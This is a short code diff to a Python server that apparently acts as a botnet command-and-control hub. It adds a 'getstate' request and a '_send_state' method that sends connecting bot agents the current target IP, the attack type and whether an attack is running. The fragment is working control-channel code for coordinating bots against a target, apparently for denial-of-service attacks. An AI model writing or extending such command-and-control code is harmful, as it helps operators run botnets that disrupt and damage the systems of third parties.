@@ -88,6 +88,8 @@ class Server():
                     # iam request applies to both master and bot agent
                     if req_type == 'iam':
                         self._iam_handler(sock, req_body)
+                    elif req_type == 'getstate':
+                        self._send_state(sock)
                     elif sock in self.bot_agents:
                         self._bot_handler(sock, req_type, req_body)
                     elif sock == self.master_client:
@@ -220,6 +222,12 @@ class Server():
             bots += self.bot_agents[bot] + ','
 
         return bots
+
+    def _send_state(self, sock: socket.socket) -> None:
+        sock.send(f'changeip:{self.target_address}'.encode(ENCODING))
+        sock.send(f'changeattk:{self.attk_type}'.encode(ENCODING))
+        sock.send(f'startattk:{self.attacking}'.encode(ENCODING))
+        return
 
 
 if __name__ == "__main__":
